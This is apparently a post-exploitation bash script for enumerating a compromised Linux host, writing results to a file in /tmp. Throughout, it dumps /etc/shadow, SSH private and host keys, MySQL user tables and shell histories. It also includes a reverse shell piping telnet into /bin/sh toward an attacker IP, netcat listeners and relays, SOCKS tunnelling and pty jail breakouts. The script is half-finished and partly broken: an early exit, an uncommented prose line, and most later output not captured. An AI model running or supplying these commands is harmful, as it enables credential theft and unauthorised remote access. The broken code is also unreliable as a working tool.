#!/bin/bash

<<COMMENT
# Enumerate a Linux box after you get either a non-root user or a root user
-ssh into box
-go to /tmp and create a file
-perform all the commands and append to each file
-may need extra commands to get ssh keys and any data eg. mysql data

-we want a regular user to do this too
./privesc.sh <IP> <username> <password>
COMMENT

# Command line arguments
CLI_ARGS="$@"
# The Target IP address
IP="$1"
# Username
ROOT_USER="$2"
# user password
PASS="$3"
# Temp directory
TMP_DIR="/tmp/"
# The file to write our privesc commands to
FN="notyours.txt"

# Change to the temp director
cd "$TMP_DIR"
# Create the file
touch "$FN"

echo "### Operating System ###" >> "$FN"
echo "# What's the distribution type? What version?" >> "$FN"

echo 'cat /etc/issue' >> "$FN"
cat /etc/issue >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo 'cat /etc/*-release' >> "$FN"
cat /etc/*-release >> "$FN" 2>&1 
echo "------------------------------------" >> "$FN"

echo 'cat /etc/lsb-release' >> "$FN"
cat /etc/lsb-release >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo 'cat /etc/redhat-release' >> "$FN"
cat /etc/redhat-release >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

exit
echo "# What's the kernel version? Is it 64-bit?" >> "$FN"
echo 'cat /proc/version' >> "$FN"
cat /proc/version >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'uname -a' >> "$FN"
uname -a >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'uname -mrs' >> "$FN"
uname -mrs >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'rpm -q kernel' >> "$FN"
rpm -q kernel >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'dmesg | grep Linux' >> "$FN"
dmesg | grep Linux >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls /boot | grep vmlinuz-' >> "$FN"
ls /boot | grep vmlinuz- >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# What can be learnt from the environmental variables?" >> "$FN"
echo 'cat /etc/profile' >> "$FN"
cat /etc/profile >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/bashrc' >> "$FN"
cat /etc/bashrc >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat ~/.bash_profile' >> "$FN"
cat ~/.bash_profile >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat ~/.bashrc' >> "$FN"
cat ~/.bashrc >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat ~/.bash_logout' >> "$FN"
cat ~/.bash_logout >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'env' >> "$FN"
env >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'set' >> "$FN"
set >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Is there a printer?" >> "$FN"
echo 'lpstat -a' >> "$FN"
lpstat -a >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "### Applications & Services ###" >> "$FN"
echo "# What services are running? Which service has which user privilege?" >> "$FN"
echo 'ps aux' >> "$FN"
ps aux >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ps -ef' >> "$FN"
ps -ef >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'top' >> "$FN"
top >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/services' >> "$FN"
cat /etc/services >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Which service(s) are been running by root? Of these services, which are vulnerable" >> "$FN"
echo 'ps aux | grep root' >> "$FN"
ps aux | grep root >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ps -ef | grep root' >> "$FN"
ps -ef | grep root >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# What applications are installed? What version are they? Are they currently running?" >> "$FN"
echo 'ls -alh /usr/bin/' >> "$FN"
ls -alh /usr/bin/ >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -alh /sbin/' >> "$FN"
ls -alh /sbin/ >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'dpkg -l' >> "$FN"
dpkg -l >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'rpm -qa' >> "$FN"
rpm -qa >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -alh /var/cache/apt/archivesO' >> "$FN"
ls -alh /var/cache/apt/archivesO >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -alh /var/cache/yum/' >> "$FN"
ls -alh /var/cache/yum/ >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?" >> "$FN"
echo 'cat /etc/syslog.conf' >> "$FN"
cat /etc/syslog.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/chttp.conf' >> "$FN"
cat /etc/chttp.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/lighttpd.conf' >> "$FN"
cat /etc/lighttpd.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/cups/cupsd.conf' >> "$FN"
cat /etc/cups/cupsd.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/inetd.conf' >> "$FN"
cat /etc/inetd.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/apache2/apache2.conf' >> "$FN"
cat /etc/apache2/apache2.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/my.conf' >> "$FN"
cat /etc/my.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/httpd/conf/httpd.conf' >> "$FN"
cat /etc/httpd/conf/httpd.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /opt/lampp/etc/httpd.conf' >> "$FN"
cat /opt/lampp/etc/httpd.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
#echo 'ls -aRl /etc/ | awk '$1 ~ /^.*r.*/' >> "$FN"
#ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# What jobs are scheduled?" >> "$FN"
echo 'crontab -l' >> "$FN"
crontab -l >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -alh /var/spool/cron' >> "$FN"
ls -alh /var/spool/cron >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -al /etc/ | grep cron' >> "$FN"
ls -al /etc/ | grep cron >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'ls -al /etc/cron*' >> "$FN"
ls -al /etc/cron* >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/cron*' >> "$FN"
cat /etc/cron* >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/at.allow' >> "$FN"
cat /etc/at.allow >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/at.deny' >> "$FN"
cat /etc/at.deny >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/cron.allow' >> "$FN"
cat /etc/cron.allow >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/cron.deny' >> "$FN"
cat /etc/cron.deny >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/crontab' >> "$FN"
cat /etc/crontab >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/anacrontab' >> "$FN"
cat /etc/anacrontab >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /var/spool/cron/crontabs/root' >> "$FN"
cat /var/spool/cron/crontabs/root >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Any plain text usernames and/or passwords?" >> "$FN"
echo 'grep -i user [filename]' >> "$FN"
grep -i user [filename] >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'grep -i pass [filename]' >> "$FN"
grep -i pass [filename] >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'grep -C 5 "password" [filename]' >> "$FN"
grep -C 5 "password" [filename] >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo "# Joomla" >> "$FN"
echo 'find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"' >> "$FN"
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "### Communications & Networking ###" >> "$FN"
echo "# What NIC(s) does the system have? Is it connected to another network?" >> "$FN"
echo '/sbin/ifconfig -a' >> "$FN"
/sbin/ifconfig -a >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/network/interfaces' >> "$FN"
cat /etc/network/interfaces >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/sysconfig/network' >> "$FN"
cat /etc/sysconfig/network >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?" >> "$FN"
echo 'cat /etc/resolv.conf' >> "$FN"
cat /etc/resolv.conf >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/sysconfig/network' >> "$FN"
cat /etc/sysconfig/network >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'cat /etc/networks' >> "$FN"
cat /etc/networks >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'iptables -L' >> "$FN"
iptables -L >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'hostname' >> "$FN"
hostname >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'dnsdomainname' >> "$FN"
dnsdomainname >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# What other users & hosts are communicating with the system?" >> "$FN"
echo 'lsof -i' >> "$FN"
lsof -i >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'lsof -i :80' >> "$FN"
lsof -i :80 >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'grep 80 /etc/services' >> "$FN"
grep 80 /etc/services >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'netstat -antup' >> "$FN"
netstat -antup >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'netstat -antpx' >> "$FN"
netstat -antpx >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'netstat -tulpn' >> "$FN"
netstat -tulpn >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'chkconfig --list' >> "$FN"
chkconfig --list >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'chkconfig --list | grep 3:on' >> "$FN"
chkconfig --list | grep 3:on >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'last' >> "$FN"
last >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'w' >> "$FN"
w >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Whats cached? IP and/or MAC addresses" >> "$FN"
echo 'arp -e' >> "$FN"
arp -e >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo 'route' >> "$FN"
route >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
echo '/sbin/route -nee' >> "$FN"
/sbin/route -nee >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

echo "# Is packet sniffing possible? What can be seen? Listen to live traffic" >> "$FN"
echo 'tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21' >> "$FN"
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"

# Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
# Have you got a shell? Can you interact with the system?
nc -lvp 4444    # Attacker. Input (Commands)
echo "------------------------------------" >> "$FN"
nc -lvp 4445    # Attacker. Ouput (Results)
echo "------------------------------------" >> "$FN"
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
echo "------------------------------------" >> "$FN"

# Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

# Is port forwarding possible? Redirect and interact with traffic from another view
# Note: http://www.boutell.com/rinetd/
# Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
# Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
# Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
echo "------------------------------------" >> "$FN"

# Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
echo "------------------------------------" >> "$FN"
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
echo "------------------------------------" >> "$FN"

# Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
echo "------------------------------------" >> "$FN"
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
echo "------------------------------------" >> "$FN"
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
echo "------------------------------------" >> "$FN"

# Is tunnelling possible? Send commands locally, remotely
ssh -D 127.0.0.1:9050 -N [username]@[ip]
echo "------------------------------------" >> "$FN"
proxychains ifconfig
echo "------------------------------------" >> "$FN"

echo "### Confidential Information & Users ###" >> "$FN"
echo "# Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?" >> "$FN"
echo 'id' >> "$FN"
id >> "$FN" 2>&1
echo "------------------------------------" >> "$FN"
who
echo "------------------------------------" >> "$FN"
w
echo "------------------------------------" >> "$FN"
last
echo "------------------------------------" >> "$FN"
cat /etc/passwd | cut -d: -f1    # List of users
echo "------------------------------------" >> "$FN"
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
echo "------------------------------------" >> "$FN"
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
echo "------------------------------------" >> "$FN"
cat /etc/sudoers
echo "------------------------------------" >> "$FN"
sudo -l
echo "------------------------------------" >> "$FN"

# What sensitive files can be found?
cat /etc/passwd
echo "------------------------------------" >> "$FN"
cat /etc/group
echo "------------------------------------" >> "$FN"
cat /etc/shadow
echo "------------------------------------" >> "$FN"
ls -alh /var/mail/
echo "------------------------------------" >> "$FN"

# Anything "interesting" in the home directorie(s)? If it's possible to access
ls -ahlR /root/
echo "------------------------------------" >> "$FN"
ls -ahlR /home/
echo "------------------------------------" >> "$FN"

# Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
cat /var/apache2/config.inc
echo "------------------------------------" >> "$FN"
cat /var/lib/mysql/mysql/user.MYD
echo "------------------------------------" >> "$FN"
cat /root/anaconda-ks.cfg
echo "------------------------------------" >> "$FN"

# What has the user being doing? Is there any password in plain text? What have they been edting?
cat ~/.bash_history
echo "------------------------------------" >> "$FN"
cat ~/.nano_history
echo "------------------------------------" >> "$FN"
cat ~/.atftp_history
echo "------------------------------------" >> "$FN"
cat ~/.mysql_history
echo "------------------------------------" >> "$FN"
cat ~/.php_history
echo "------------------------------------" >> "$FN"

# What user information can be found?
cat ~/.bashrc
echo "------------------------------------" >> "$FN"
cat ~/.profile
echo "------------------------------------" >> "$FN"
cat /var/mail/root
echo "------------------------------------" >> "$FN"
cat /var/spool/mail/root
echo "------------------------------------" >> "$FN"

# Can private-key information be found?
cat ~/.ssh/authorized_keys
echo "------------------------------------" >> "$FN"
cat ~/.ssh/identity.pub
echo "------------------------------------" >> "$FN"
cat ~/.ssh/identity
echo "------------------------------------" >> "$FN"
cat ~/.ssh/id_rsa.pub
echo "------------------------------------" >> "$FN"
cat ~/.ssh/id_rsa
echo "------------------------------------" >> "$FN"
cat ~/.ssh/id_dsa.pub
echo "------------------------------------" >> "$FN"
cat ~/.ssh/id_dsa
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_config
echo "------------------------------------" >> "$FN"
cat /etc/ssh/sshd_config
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_dsa_key.pub
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_dsa_key
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_rsa_key.pub
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_rsa_key
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_key.pub
echo "------------------------------------" >> "$FN"
cat /etc/ssh/ssh_host_key
echo "------------------------------------" >> "$FN"

### File Systems ###
# Which configuration files can be written in /etc/? Able to reconfigure a service?
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
echo "------------------------------------" >> "$FN"
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
echo "------------------------------------" >> "$FN"
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
echo "------------------------------------" >> "$FN"
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
echo "------------------------------------" >> "$FN"
find /etc/ -readable -type f 2>/dev/null               # Anyone
echo "------------------------------------" >> "$FN"
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
echo "------------------------------------" >> "$FN"

# What can be found in /var/ ?
ls -alh /var/log
echo "------------------------------------" >> "$FN"
ls -alh /var/mail
echo "------------------------------------" >> "$FN"
ls -alh /var/spool
echo "------------------------------------" >> "$FN"
ls -alh /var/spool/lpd
echo "------------------------------------" >> "$FN"
ls -alh /var/lib/pgsql
echo "------------------------------------" >> "$FN"
ls -alh /var/lib/mysql
echo "------------------------------------" >> "$FN"
cat /var/lib/dhcp3/dhclient.leases
echo "------------------------------------" >> "$FN"

# Any settings/files (hidden) on website? Any settings file with database information?
ls -alhR /var/www/
echo "------------------------------------" >> "$FN"
ls -alhR /srv/www/htdocs/
echo "------------------------------------" >> "$FN"
ls -alhR /usr/local/www/apache22/data/
echo "------------------------------------" >> "$FN"
ls -alhR /opt/lampp/htdocs/
echo "------------------------------------" >> "$FN"
ls -alhR /var/www/html/
echo "------------------------------------" >> "$FN"

# Is there anything in the log file(s) (Could help with "Local File Includes"!)
cat /etc/httpd/logs/access_log
echo "------------------------------------" >> "$FN"
cat /etc/httpd/logs/access.log
echo "------------------------------------" >> "$FN"
cat /etc/httpd/logs/error_log
echo "------------------------------------" >> "$FN"
cat /etc/httpd/logs/error.log
echo "------------------------------------" >> "$FN"
cat /var/log/apache2/access_log
echo "------------------------------------" >> "$FN"
cat /var/log/apache2/access.log
echo "------------------------------------" >> "$FN"
cat /var/log/apache2/error_log
echo "------------------------------------" >> "$FN"
cat /var/log/apache2/error.log
echo "------------------------------------" >> "$FN"
cat /var/log/apache/access_log
echo "------------------------------------" >> "$FN"
cat /var/log/apache/access.log
echo "------------------------------------" >> "$FN"
cat /var/log/auth.log
echo "------------------------------------" >> "$FN"
cat /var/log/chttp.log
echo "------------------------------------" >> "$FN"
cat /var/log/cups/error_log
echo "------------------------------------" >> "$FN"
cat /var/log/dpkg.log
echo "------------------------------------" >> "$FN"
cat /var/log/faillog
echo "------------------------------------" >> "$FN"
cat /var/log/httpd/access_log
echo "------------------------------------" >> "$FN"
cat /var/log/httpd/access.log
echo "------------------------------------" >> "$FN"
cat /var/log/httpd/error_log
echo "------------------------------------" >> "$FN"
cat /var/log/httpd/error.log
echo "------------------------------------" >> "$FN"
cat /var/log/lastlog
echo "------------------------------------" >> "$FN"
cat /var/log/lighttpd/access.log
echo "------------------------------------" >> "$FN"
cat /var/log/lighttpd/error.log
echo "------------------------------------" >> "$FN"
cat /var/log/lighttpd/lighttpd.access.log
echo "------------------------------------" >> "$FN"
cat /var/log/lighttpd/lighttpd.error.log
echo "------------------------------------" >> "$FN"
cat /var/log/messages
echo "------------------------------------" >> "$FN"
cat /var/log/secure
echo "------------------------------------" >> "$FN"
cat /var/log/syslog
echo "------------------------------------" >> "$FN"
cat /var/log/wtmp
echo "------------------------------------" >> "$FN"
cat /var/log/xferlog
echo "------------------------------------" >> "$FN"
cat /var/log/yum.log
echo "------------------------------------" >> "$FN"
cat /var/run/utmp
echo "------------------------------------" >> "$FN"
cat /var/webmin/miniserv.log
echo "------------------------------------" >> "$FN"
cat /var/www/logs/access_log
echo "------------------------------------" >> "$FN"
cat /var/www/logs/access.log
echo "------------------------------------" >> "$FN"
ls -alh /var/lib/dhcp3/
echo "------------------------------------" >> "$FN"
ls -alh /var/log/postgresql/
echo "------------------------------------" >> "$FN"
ls -alh /var/log/proftpd/
echo "------------------------------------" >> "$FN"
ls -alh /var/log/samba/
echo "------------------------------------" >> "$FN"
# Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp

# Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
#If commands are limited, you break out of the "jail" shell?
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i

# How are file-systems mounted?
mount
echo "------------------------------------" >> "$FN"
df -h
echo "------------------------------------" >> "$FN"

# Are there any unmounted file-systems?
cat /etc/fstab
echo "------------------------------------" >> "$FN"

# What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
echo "------------------------------------" >> "$FN"
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
echo "------------------------------------" >> "$FN"
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
echo "------------------------------------" >> "$FN"

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
echo "------------------------------------" >> "$FN"
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
echo "------------------------------------" >> "$FN"

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
echo "------------------------------------" >> "$FN"

Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null      # world-writeable folders
echo "------------------------------------" >> "$FN"
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
echo "------------------------------------" >> "$FN"
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
echo "------------------------------------" >> "$FN"
find / -perm -o x -type d 2>/dev/null     # world-executable folders
echo "------------------------------------" >> "$FN"
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
echo "------------------------------------" >> "$FN"

# Any "problem" files? Word-writeable, "nobody" files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
echo "------------------------------------" >> "$FN"
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
echo "------------------------------------" >> "$FN"

### Preparation & Finding Exploit Code ###
# What development tools/languages are installed/supported?
find / -name perl*
echo "------------------------------------" >> "$FN"
find / -name python*
echo "------------------------------------" >> "$FN"
find / -name gcc*
echo "------------------------------------" >> "$FN"
find / -name cc
echo "------------------------------------" >> "$FN"

# How can files be uploaded?
find / -name wget
echo "------------------------------------" >> "$FN"
find / -name nc*
echo "------------------------------------" >> "$FN"
find / -name netcat*
echo "------------------------------------" >> "$FN"
find / -name tftp*
echo "------------------------------------" >> "$FN"
find / -name ftp
echo "------------------------------------" >> "$FN"
